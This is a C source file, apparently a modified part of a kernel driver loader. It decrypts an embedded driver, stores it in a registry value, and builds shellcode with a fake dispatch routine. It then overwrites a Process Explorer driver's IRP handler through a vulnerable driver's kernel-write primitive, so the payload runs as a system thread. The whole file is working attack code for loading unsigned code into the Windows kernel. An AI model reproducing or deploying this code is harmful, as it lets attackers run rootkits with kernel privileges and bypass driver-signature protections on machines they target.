#include "global.h"
#include "irp.h"

//#include "NWGlobal.h"
#include "encrypt.h"
//#include "Protect/VMProtectSDK.h"

#define BOOTSTRAPCODE_SIZE 1968 //correct this value if Import change it size


typedef struct _SHELLCODE
{
    BYTE InitCode[16];
    BYTE BootstrapCode[BOOTSTRAPCODE_SIZE];
    FUNC_TABLE Import;
} SHELLCODE, * PSHELLCODE;


SHELLCODE*          g_ShellCode;
IO_STACK_LOCATION   g_testIostl;


PVOID NTAPI ExAllocatePoolTest(_In_ POOL_TYPE PoolType, _In_ SIZE_T NumberOfBytes)
{
    PVOID P;
    UNREFERENCED_PARAMETER(PoolType);

    P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    return P;
}


VOID NTAPI ExFreePoolTest(_In_ PVOID P)
{
    VirtualFree(P, 0, MEM_RELEASE);
}


VOID IofCompleteRequestTest(_In_ VOID* Irp, _In_ CCHAR PriorityBoost)
{
    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(PriorityBoost);
    return;
}


NTSTATUS NTAPI PsCreateSystemThreadTest(PHANDLE ThreadHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PCLIENT_ID ClientId, PKSTART_ROUTINE StartRoutine, PVOID StartContext)
{
    UNREFERENCED_PARAMETER(ThreadHandle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectAttributes);
    UNREFERENCED_PARAMETER(ProcessHandle);
    UNREFERENCED_PARAMETER(ClientId);
    UNREFERENCED_PARAMETER(StartRoutine);
    UNREFERENCED_PARAMETER(StartContext);
    return STATUS_SUCCESS;
}


FORCEINLINE PIO_STACK_LOCATION IoGetCurrentIrpStackLocationTest(_In_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(Irp);
    g_testIostl.MajorFunction = IRP_MJ_CREATE;
    return &g_testIostl;
}


ULONG SizeOfProc(_In_ PBYTE FunctionPtr)
{
    ULONG   c = 0;
    UCHAR*  p;
    hde64s  hs;

    __try {

        do {
            p = FunctionPtr + c;
            hde64_disasm(p, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (*p != 0xC3);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return c;
}


NTSTATUS NTAPI FakeDispatchRoutine(_In_ struct _DEVICE_OBJECT* DeviceObject, _Inout_ struct _IRP* Irp, _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           returnLength = 0, isz, dummy;
    HANDLE                          hKey = NULL, hThread;
    UNICODE_STRING                  str;
    OBJECT_ATTRIBUTES               obja;
    KEY_VALUE_PARTIAL_INFORMATION   keyinfo;
    KEY_VALUE_PARTIAL_INFORMATION* pkeyinfo;
    ULONG_PTR                       Image, exbuffer, pos;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chains;
    DWORD                           c, p, rsz;

    WCHAR                           szRegistryKey[] = {
        L'\\', L'R', L'E', L'G', L'I', L'S', L'T', L'R', L'Y', L'\\',\
        L'M', L'A', L'C', L'H', L'I', L'N', L'E', 0
    };

    USHORT                          cbRegistryKey = sizeof(szRegistryKey) - sizeof(WCHAR);

    WCHAR                           szValueKey[] = { L'~', 0 };

    USHORT                          cbValueKey = sizeof(szValueKey) - sizeof(WCHAR);

    UNREFERENCED_PARAMETER(DeviceObject);

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {

        str.Buffer = szRegistryKey;
        str.Length = cbRegistryKey;
        str.MaximumLength = str.Length + sizeof(UNICODE_NULL);

#ifdef _DEBUG
        InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE, 0, 0);
#else
        InitializeObjectAttributes(&obja, &str, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
#endif

        status = ShellCode->Import.ZwOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
        if (NT_SUCCESS(status)) {

            str.Buffer = szValueKey;
            str.Length = cbValueKey;
            str.MaximumLength = str.Length + sizeof(UNICODE_NULL);

            status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
                &keyinfo, sizeof(KEY_VALUE_PARTIAL_INFORMATION), &returnLength);

            if ((status == STATUS_BUFFER_OVERFLOW) ||
                (status == STATUS_BUFFER_TOO_SMALL))
            {
                pkeyinfo = (KEY_VALUE_PARTIAL_INFORMATION*)ShellCode->Import.ExAllocatePool(NonPagedPool, returnLength);
                if (pkeyinfo) {

                    status = ShellCode->Import.ZwQueryValueKey(hKey, &str, KeyValuePartialInformation,
                        (PVOID)pkeyinfo, returnLength, &dummy);
                    if (NT_SUCCESS(status)) {

                        ShellCode->Import.ZwDeleteValueKey(hKey, &str);

                        Image = (ULONG_PTR)&pkeyinfo->Data[0];
                        dosh = (PIMAGE_DOS_HEADER)Image;
                        fileh = (PIMAGE_FILE_HEADER)(Image + sizeof(DWORD) + dosh->e_lfanew);
                        popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                        isz = popth->SizeOfImage;

                        exbuffer = (ULONG_PTR)ShellCode->Import.ExAllocatePool(
                            NonPagedPool, isz + PAGE_SIZE) + PAGE_SIZE;
                        if (exbuffer != 0) {

                            exbuffer &= ~(PAGE_SIZE - 1);

                            if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC)
                                if (popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
                                {
                                    rel = (PIMAGE_BASE_RELOCATION)((PBYTE)Image +
                                        popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

                                    rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                                    delta = (DWORD_PTR)exbuffer - popth->ImageBase;
                                    c = 0;

                                    while (c < rsz) {
                                        p = sizeof(IMAGE_BASE_RELOCATION);
                                        chains = (LPWORD)((PBYTE)rel + p);

                                        while (p < rel->SizeOfBlock) {

                                            switch (*chains >> 12) {
                                            case IMAGE_REL_BASED_HIGHLOW:
                                                *(LPDWORD)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += (DWORD)delta;
                                                break;
                                            case IMAGE_REL_BASED_DIR64:
                                                *(PULONGLONG)((ULONG_PTR)Image + rel->VirtualAddress + (*chains & 0x0fff)) += delta;
                                                break;
                                            }

                                            chains++;
                                            p += sizeof(WORD);
                                        }

                                        c += rel->SizeOfBlock;
                                        rel = (PIMAGE_BASE_RELOCATION)((PBYTE)rel + rel->SizeOfBlock);
                                    }
                                }

                            isz >>= 3;
                            for (pos = 0; pos < isz; pos++)
                                ((PULONG64)exbuffer)[pos] = ((PULONG64)Image)[pos];

                            hThread = NULL;
                            InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
                            if (NT_SUCCESS(ShellCode->Import.PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
                                (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL)))
                            {
                                ShellCode->Import.ZwClose(hThread);
                            }

                            DeviceObject->SectorSize = 512;
                        }
                    }
                    ShellCode->Import.ExFreePool(pkeyinfo);
                }
            }
            ShellCode->Import.ZwClose(hKey);
        }
    }
    ShellCode->Import.IofCompleteRequest(Irp, 0);
    return STATUS_SUCCESS;
}


extern HINSTANCE		g_hInstance;
BOOL KDUStorePayload(_In_ ULONG_PTR KernelImage, _In_ ULONG_PTR KernelBase)
{
    BOOL bSuccess = FALSE;
    HKEY hKey = NULL;
    PVOID DataBuffer = NULL;
    LRESULT lResult;

    ULONG isz;
    PVOID Image = NULL;
    PIMAGE_NT_HEADERS FileHeader;

	//OutputDebugStringW(L"[ENG] KDU load 1");
	//////////////////////////////////////////////////////////////////////////
	HRSRC hRSrc = FindResource(g_hInstance, MAKEINTRESOURCE(IDB_NWDRV), RT_BITMAP);
	if (hRSrc == NULL)
		return FALSE;

	HGLOBAL hGlobal = LoadResource(g_hInstance, hRSrc);
	if (hGlobal == NULL)
		return FALSE;

	//OutputDebugStringW(L"[ENG] KDU load 2");
	ULONG DataSize = SizeofResource(g_hInstance, hRSrc);
	PBYTE drvCipher = new BYTE[DataSize];
	memcpy(drvCipher, LockResource(hGlobal), DataSize);
	PBYTE drvBuffer = DecryptBlock(drvCipher, DataSize, DataSize);
	delete[] drvCipher;

	if (!drvBuffer)
		return FALSE;

	//OutputDebugStringW(L"[ENG] KDU load 33");
    Image = LoadPE64(drvBuffer);
    delete[] drvBuffer;

    if (!Image)
        return FALSE;

    //OutputDebugStringW(L"[ENG] KDU0");
    FileHeader = RtlImageNtHeader(Image);

    //OutputDebugStringW(L"[ENG] KDU1");
    if (FileHeader)
    {
        isz = FileHeader->OptionalHeader.SizeOfImage;

        DataBuffer = supHeapAlloc(isz);
        if (DataBuffer)
        {
            //OutputDebugStringW(L"[ENG] KDU2");

            RtlCopyMemory(DataBuffer, Image, isz);
            supResolveKernelImport((ULONG_PTR)DataBuffer, KernelImage, KernelBase);

            BYTE pbPat1[] = { 0x40, 0x80, 0xFE, 0xC3 };
            BYTE pbPat2[] = { 0xFF, 0x15 };
            BYTE pbPat3[] = { 0xFF, 0xD0, 0x90, 0x90, 0x90, 0x90 };
            int nLen1 = 4;
            int nLen2 = 2;
            int nLen3 = 6;
            int i, j;
            for (i = 0; i < isz - nLen1; i++)
            {
                for (j = 0; j < nLen1; j++)
                {
                    if (*(BYTE*)((PBYTE)DataBuffer + i + j) != pbPat1[j])
                        break;
                }

                if (j == nLen1)
                    break;
            }

            for (; i < isz - nLen2; i++)
            {
                for (j = 0; j < nLen2; j++)
				{
					if (*(BYTE*)((PBYTE)DataBuffer + i + j) != pbPat2[j])
						break;
				}

                if (j == nLen2)
                    break;
            }

            RtlCopyMemory((PBYTE)DataBuffer + i, pbPat3, nLen3);

			//OutputDebugStringW(L"[ENG] KDU3");
            lResult = RegOpenKey(HKEY_LOCAL_MACHINE, NULL, &hKey);
            if ((lResult == ERROR_SUCCESS) && (hKey != NULL))
            {
                lResult = RegSetKeyValue(hKey, NULL, TEXT("~"), REG_BINARY, DataBuffer, isz);
                bSuccess = (lResult == ERROR_SUCCESS);
                RegCloseKey(hKey);
            }
            supHeapFree(DataBuffer);
        }
    }

    return bSuccess;
}

ULONG_PTR KDUResolveFunctionInternal(_In_ ULONG_PTR KernelBase, _In_ ULONG_PTR KernelImage, _In_ LPCSTR Function)
{
    ULONG_PTR Address = supGetProcAddress(KernelBase, KernelImage, Function);
    if (Address == 0)
        return 0;

    return Address;
}

#define ASSERT_RESOLVED_FUNC(FunctionPtr) { if (FunctionPtr == 0) break; }


BOOL KDUSetupShellCode(_In_ PKDU_CONTEXT Context)
{
    BOOL bResult = FALSE;
    NTSTATUS ntStatus;
    ULONG ProcedureSize = 0;
    UNICODE_STRING ustr;

    ULONG_PTR KernelBase, KernelImage = 0;

    WCHAR szNtOs[MAX_PATH * 2];

	//OutputDebugStringW(L"[ENG] KDUSetupShellCode");

    do {

        KernelBase = Context->NtOsBase;
        if (KernelBase == 0)
            break;

        _strcpy(szNtOs, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szNtOs, L"\\system32\\ntoskrnl.exe");

        RtlInitUnicodeString(&ustr, szNtOs);
        ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)&KernelImage);

        if ((!NT_SUCCESS(ntStatus)) || (KernelImage == 0))
            break;

        if (!KDUStorePayload(KernelImage, KernelBase))
            break;

        g_ShellCode = (SHELLCODE*)VirtualAlloc(NULL, sizeof(SHELLCODE), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (g_ShellCode == NULL)
            break;

        //
        // Build initial code part.
        //
        // 00 call +5
        // 05 pop r8
        // 07 sub r8, 5
        // 0B jmps 10 
        // 0D int 3
        // 0E int 3
        // 0F int 3
        // 10 code


        //int 3
        memset(g_ShellCode->InitCode, 0xCC, sizeof(g_ShellCode->InitCode));

        //call +5
        g_ShellCode->InitCode[0x0] = 0xE8;
        g_ShellCode->InitCode[0x1] = 0x00;
        g_ShellCode->InitCode[0x2] = 0x00;
        g_ShellCode->InitCode[0x3] = 0x00;
        g_ShellCode->InitCode[0x4] = 0x00;

        //pop r8
        g_ShellCode->InitCode[0x5] = 0x41;
        g_ShellCode->InitCode[0x6] = 0x58;

        //sub r8, 5
        g_ShellCode->InitCode[0x7] = 0x49;
        g_ShellCode->InitCode[0x8] = 0x83;
        g_ShellCode->InitCode[0x9] = 0xE8;
        g_ShellCode->InitCode[0xA] = 0x05;

        // jmps 
        g_ShellCode->InitCode[0xB] = 0xEB;
        g_ShellCode->InitCode[0xC] = 0x03;

        //
        // Remember function pointers.
        //

        g_ShellCode->Import.ExAllocatePool =
            (pfnExAllocatePool)KDUResolveFunctionInternal(KernelBase, KernelImage, "ExAllocatePool");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ExAllocatePool);

        g_ShellCode->Import.ExFreePool =
            (pfnExFreePool)KDUResolveFunctionInternal(KernelBase, KernelImage, "ExFreePool");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ExFreePool);

        g_ShellCode->Import.PsCreateSystemThread =
            (pfnPsCreateSystemThread)KDUResolveFunctionInternal(KernelBase, KernelImage, "PsCreateSystemThread");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.PsCreateSystemThread);

        g_ShellCode->Import.IofCompleteRequest =
            (pfnIofCompleteRequest)KDUResolveFunctionInternal(KernelBase, KernelImage, "IofCompleteRequest");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.IofCompleteRequest);

        g_ShellCode->Import.ZwClose =
            (pfnZwClose)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwClose");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwClose);

        g_ShellCode->Import.ZwOpenKey =
            (pfnZwOpenKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwOpenKey");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwOpenKey);

        g_ShellCode->Import.ZwQueryValueKey =
            (pfnZwQueryValueKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwQueryValueKey");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwQueryValueKey);

        g_ShellCode->Import.ZwDeleteValueKey =
            (pfnZwDeleteValueKey)KDUResolveFunctionInternal(KernelBase, KernelImage, "ZwDeleteValueKey");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.ZwDeleteValueKey);

        /*g_ShellCode->Import.DbgPrint =
            (pfnDbgPrint)KDUResolveFunctionInternal(KernelBase, KernelImage, "DbgPrint");
        ASSERT_RESOLVED_FUNC(g_ShellCode->Import.DbgPrint);*/


        ProcedureSize = SizeOfProc((PBYTE)FakeDispatchRoutine);
        if (ProcedureSize != 0)
        {
            if (ProcedureSize > sizeof(g_ShellCode->BootstrapCode))
                break;
            memcpy(g_ShellCode->BootstrapCode, FakeDispatchRoutine, ProcedureSize);
        }

        bResult = TRUE;

    } while (FALSE);

    return bResult;
}


BOOL KDUCheckMemoryLayout(_In_ KDU_CONTEXT* Context, _In_ ULONG_PTR TargetAddress)
{
    ULONG_PTR memPage, physAddrStart, physAddrEnd;

    KDU_PROVIDER* prov = Context->Provider;

    //
    // If provider does not support translation return TRUE.
    //
    if ((PVOID)prov->Callbacks.VirtualToPhysical == (PVOID)KDUProviderStub)
        return TRUE;

    memPage = (TargetAddress & 0xfffffffffffff000ull);

    if (prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
        memPage,
        &physAddrStart))
    {
        memPage = (TargetAddress + sizeof(SHELLCODE)) & 0xfffffffffffff000ull;

        if (prov->Callbacks.VirtualToPhysical(Context->DeviceHandle,
            memPage,
            &physAddrEnd))
        {
            ULONG_PTR diffAddr = physAddrEnd - physAddrStart;

            if (diffAddr > PAGE_SIZE)
                return FALSE;
            else
                return TRUE;
        }

    }
    return FALSE;
}


BOOL KDUMapDriver(_In_ PKDU_CONTEXT Context)
{
    BOOL bSuccess = FALSE;
    ULONG_PTR objectAddress, targetAddress = 0;
    FILE_OBJECT fileObject;
    DEVICE_OBJECT deviceObject;
    DRIVER_OBJECT driverObject;

    KDU_PROVIDER* prov = Context->Provider;
    ULONG retryCount = 1, maxRetry = 3;
    HANDLE victimDeviceHandle = NULL;

	//OutputDebugStringW(L"[ENG] KDUMapDriver");

Reload:

    if (victimDeviceHandle)
    {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
        VictimRelease((LPWSTR)PROCEXP152);
    }

    VictimCreate(Context->ModuleBase, (LPWSTR)PROCEXP152, IDB_PROCEXP, &victimDeviceHandle);
    if (supQueryObjectFromHandle(victimDeviceHandle, &objectAddress))
    {
        do {

            RtlSecureZeroMemory(&fileObject, sizeof(fileObject));
            if (!KDUReadKernelVM(Context, objectAddress, &fileObject, sizeof(FILE_OBJECT)))
                break;

            RtlSecureZeroMemory(&deviceObject, sizeof(deviceObject));
            if (!KDUReadKernelVM(Context, (ULONG_PTR)fileObject.DeviceObject, &deviceObject, sizeof(DEVICE_OBJECT)))
                break;

            RtlSecureZeroMemory(&driverObject, sizeof(driverObject));
            if (!KDUReadKernelVM(Context, (ULONG_PTR)deviceObject.DriverObject, &driverObject, sizeof(DRIVER_OBJECT)))
                break;

            NtClose(victimDeviceHandle);
            victimDeviceHandle = NULL;

            targetAddress = (ULONG_PTR)driverObject.MajorFunction[IRP_MJ_DEVICE_CONTROL];
            if (!KDUCheckMemoryLayout(Context, targetAddress))
            {
                retryCount += 1;
                if (retryCount > maxRetry)
                    break;
                goto Reload;
            }

            bSuccess = TRUE;

        } while (FALSE);
    }

    if (victimDeviceHandle)
    {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    if (bSuccess)
    {
        if (KDUSetupShellCode(Context))
        {
            if (prov->Callbacks.WriteKernelVM(Context->DeviceHandle, targetAddress, g_ShellCode, sizeof(SHELLCODE)))
            {
                Sleep(1000);
                supOpenDriver((LPWSTR)PROCEXP152, GENERIC_READ| GENERIC_WRITE, &victimDeviceHandle);
                Sleep(1000);
            }
        }
    }

    if (victimDeviceHandle)
        NtClose(victimDeviceHandle);
    VictimRelease((LPWSTR)PROCEXP152);

    return FALSE;
}
